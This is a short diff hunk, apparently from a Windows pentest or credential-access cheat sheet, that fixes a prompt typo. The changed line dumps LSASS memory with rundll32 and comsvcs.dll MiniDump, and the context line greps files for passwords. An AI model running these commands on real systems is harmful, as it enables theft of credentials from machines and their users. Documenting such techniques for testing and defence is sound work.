@@ -922,7 +922,7 @@ C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.y
 
 ```
 PS C:\> Get-Process lsass
-PS :\> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+PS C:\> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 ```
 
 - Reg
